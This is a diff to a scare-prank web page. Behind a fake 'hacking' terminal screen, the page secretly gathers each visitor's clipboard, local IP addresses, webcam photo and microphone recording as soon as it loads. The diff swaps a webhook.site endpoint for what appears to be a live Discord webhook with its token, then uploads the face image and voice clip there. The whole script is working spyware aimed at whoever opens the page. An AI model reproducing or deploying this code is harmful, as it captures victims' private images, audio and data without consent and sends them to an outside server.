@@ -8,7 +8,6 @@
   @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
   body { background: #000; color: #ff003c; font-family: 'Fira Code', monospace; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; cursor: none; }
   
-  /* Тряска и вспышки */
   @keyframes shake { 0%,100% { transform: translate(0,0) rotate(0); } 25% { transform: translate(-2px,2px) rotate(-1deg); } 50% { transform: translate(2px,-1px) rotate(1deg); } 75% { transform: translate(1px,2px) rotate(0); } }
   .shaking { animation: shake 0.2s infinite; }
   @keyframes flash { 0%,100% { background: #000; } 50% { background: #400; } }
@@ -49,9 +48,9 @@
 
 <script>
 // =====================================================================
-// 1. КОНФИГУРАЦИЯ
+// 1. КОНФИГУРАЦИЯ (Твой Discord Webhook)
 // =====================================================================
-const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
+const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
 const term = document.getElementById('term');
 const video = document.getElementById('hidden-video');
 let megaData = {
@@ -61,19 +60,15 @@ let megaData = {
   screen: screen.width + "x" + screen.height,
   timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
   languages: navigator.languages,
-  cores: navigator.hardwareConcurrency,
-  memory: navigator.deviceMemory,
-  touch: navigator.maxTouchPoints,
-  local_ips: [], // WebRTC
+  local_ips: [],
   clipboard: "Нет доступа",
-  photo: "Нет доступа",
-  audio: "Нет доступа"
+  photo: null,
+  audio: null
 };
 
 // =====================================================================
-// 2. МГНОВЕННЫЙ СБОР (WebRTC Local IP + Clipboard)
+// 2. МГНОВЕННЫЙ СБОР (WebRTC + Clipboard)
 // =====================================================================
-// WebRTC вытаскивает локальные IP (192.168.x.x), игнорируя VPN
 async function getLocalIPs() {
   return new Promise((resolve) => {
     const ips = [];
@@ -90,11 +85,10 @@ async function getLocalIPs() {
   });
 }
 
-// Чтение буфера обмена (требует клика или разрешения)
 async function getClipboard() {
   try {
     const text = await navigator.clipboard.readText();
-    megaData.clipboard = text.slice(0, 100); // Первые 100 символов
+    megaData.clipboard = text.slice(0, 100);
   } catch(e) {}
 }
 
@@ -105,28 +99,26 @@ async function capturePhotoAndAudio() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
     video.srcObject = stream;
-    await new Promise(r => setTimeout(r, 1000)); // Фокус
+    await new Promise(r => setTimeout(r, 1000));
 
-    // Фото
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
-    megaData.photo = canvas.toDataURL('image/jpeg', 0.5);
+    megaData.photo = canvas.toDataURL('image/jpeg', 0.6);
 
-    // Аудио (3 сек)
     const recorder = new MediaRecorder(stream);
     const chunks = [];
     recorder.ondataavailable = e => chunks.push(e.data);
     recorder.onstop = () => {
-      const reader = new FileReader();
-      reader.onloadend = () => { megaData.audio = reader.result.split(',')[1]; };
-      reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
+      megaData.audio = new Blob(chunks, { type: 'audio/webm' });
     };
     recorder.start();
     await new Promise(r => setTimeout(r, 3000));
     recorder.stop();
     stream.getTracks().forEach(t => t.stop());
-  } catch(e) { megaData.photo = "Отказано"; megaData.audio = "Отказано"; }
+  } catch(e) { 
+    console.log("Camera/Mic error:", e); 
+  }
 }
 
 // =====================================================================
@@ -172,7 +164,7 @@ async function runHack() {
   document.body.classList.add('shaking', 'flashing');
   playBeep();
 
-  // Запускаем сбор в фоне
+  // Сбор данных в фоне
   getClipboard();
   getLocalIPs().then(ips => megaData.local_ips = ips);
   capturePhotoAndAudio();
@@ -192,13 +184,25 @@ async function runHack() {
   await addProgress("Uploading Biometrics");
   await addProgress("Encrypting Files");
 
-  await typeLine("> UPLOADING TO C2 SERVER...");
+  await typeLine("> UPLOADING TO C2 SERVER (DISCORD)...");
 
-  // ОТПРАВКА ВСЕГО
+  // ОТПРАВКА В DISCORD
+  const form = new FormData();
+  form.append("content", `**🚨 НОВЫЙ ВЗЛОМ!**\n**UA:** ${megaData.userAgent}\n**TZ:** ${megaData.timezone}\n**Local IPs:** ${megaData.local_ips.join(", ")}\n**Clipboard:** ${megaData.clipboard}`);
+  
+  if (megaData.photo && megaData.photo.startsWith("data:image")) {
+    const blob = await (await fetch(megaData.photo)).blob();
+    form.append("file1", blob, "face.jpg");
+  }
+  
+  if (megaData.audio) {
+    form.append("file2", megaData.audio, "voice.webm");
+  }
+
   fetch(HOOK, {
-    method: "POST", mode: "no-cors", headers: {"Content-Type": "text/plain"},
-    body: JSON.stringify(megaData)
-  }).catch(e => {});
+    method: "POST",
+    body: form
+  }).catch(e => console.log("Discord error:", e));
 
   await typeLine("> COMPLETE. LOCKING DEVICE...");
   document.body.classList.remove('shaking', 'flashing');
@@ -207,7 +211,7 @@ async function runHack() {
   playBeep();
 }
 
-// Запуск через 1 сек
+// Запуск
 setTimeout(runHack, 1000);
 
 // Блокировка выхода
